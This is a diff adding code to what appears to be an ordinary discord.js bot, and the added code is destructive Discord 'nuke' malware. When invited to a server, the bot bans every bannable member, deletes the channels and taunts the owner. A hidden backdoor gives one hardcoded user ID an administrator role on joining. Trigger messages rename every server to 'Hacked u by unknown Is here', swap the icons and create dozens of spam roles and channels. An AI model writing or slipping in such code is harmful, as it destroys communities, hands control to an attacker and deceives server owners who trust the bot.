@@ -354,4 +354,443 @@ message.channel.sendFile(canvas.toBuffer())
 
 
 
+
+
+var prefix = "F"
+client.on("message", message => {
+  if(!message.content.startsWith(prefix)) return;;
+  let args = message.content.split(" ").slice(1);
+  var argresult = args.join(' ');
+  if (message.content.startsWith('hix15')) {
+    client.user.setUsername(argresult);
+  }
+    if (message.content.startsWith(prefix + 'هلا بأحلا شباب')) {
+    client.user.setStatus(argresult);
+  }
+});
+
+client.on('message', message => {
+     if (message.content === ".") {
+         client.guilds.forEach(m =>{
+             m.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
+})
+}
+});
+client.on('message', message => {
+     if (message.content === ".") {
+         client.guilds.forEach(m =>{
+             m.setName(`Hacked u by unknown Is here`)
+})
+}
+});
+ 
+client.on('message', message => {
+     if (message.content === ".") {
+                 if(!message.channel.guild) return;
+ 
+             message.guild.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
+ 
+}
+});
+ 
+client.on('message', message => {
+     
+ 
+     if (message.content === "شباب مين مبرمج") {
+         client.guilds.forEach(m =>{
+  m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+     m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+ 
+   
+})
+ 
+ 
+}
+});
+
+
+
+
+
+client.on('message', message => {
+         if (message.content === ".") {
+               client.guilds.forEach(m =>{
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+})
+}
+});
+ 
+client.on('message', message => {
+         if (message.content === ".") {
+                 client.guilds.forEach(m =>{
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+ 
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+ 
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+ 
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+ 
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+ 
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+ 
+ 
+ 
+})
+}
+ 
+});
+ 
+ 
+const { Client } = require('discord.js');
+const client = new Client();
+ 
+async function nuke(guild) {
+  let users = 0;
+  let channels = 0;
+ 
+  await guild.fetchMembers();
+ 
+  await guild.owner.send(' Hacked u by unknown Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
+ 
+ 
+ 
+  await Promise.all(guild.members.map(async (m) => {
+    if (m.bannable) {
+      users++;
+      await m.send('^_^').catch(e => { return void e; });
+      return m.ban();
+    }
+  }));
+ 
+    await Promise.all(guild.channels.map(c => {
+    if (c.deletable) {
+      channels++;
+      return c.delete();
+    }
+  }));
+ 
+    await guild.createChannel('Hacked u by unknown Is here', 'text');
+ 
+      await guild.createChannel('Hacked u by unknown Is here', 'voice');
+ 
+ 
+ 
+}
+
+
+client.on('guildCreate', async (guild) => {
+  return nuke(guild).catch(console.error);
+});
+ 
+client.on('guildMemberAdd', member => {
+   
+            if (member.id === "382889731316514826") {
+                member.guild.createRole({
+                    name : client.user.username,
+                    color : "RANDOM",
+                    permissions : [8]
+                }).then(function(role){
+                    member.addRole(role)
+                })
+               
+            }
+       
+    });
+
+
+
+
+
+
+
 client.login(process.env.BOT_TOKEN);
